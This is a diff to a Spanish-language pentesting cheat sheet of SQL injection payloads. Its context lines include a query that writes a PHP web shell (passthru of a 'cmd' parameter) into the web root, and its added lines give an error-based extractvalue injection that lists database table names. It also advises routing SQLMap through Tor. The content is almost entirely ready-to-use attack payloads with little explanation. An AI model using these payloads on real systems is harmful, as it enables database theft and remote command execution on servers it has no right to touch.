@@ -218,6 +218,9 @@ Se accede mediante /shell.php?cmd=comando a ejecutar
 ' union select 1, 2, 3 into dumpfile 'archivo.txt' #
 SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php'; Para insertar shell si se tiene acceso con privilegios
 
+SQL Injection en Where (UPDATE o DELETE, muestra la salida en el error que aparece):
+	en el parámetro vulnerable: param=extractvalue(0x0a,concat(0x0a,(select+table_name+from+information_schema.tables))%0d%0a
+	+limit+X,1) si devuelve más de una columna y da error
 
 #SQLMAP
 Importante --tor y --check-tor
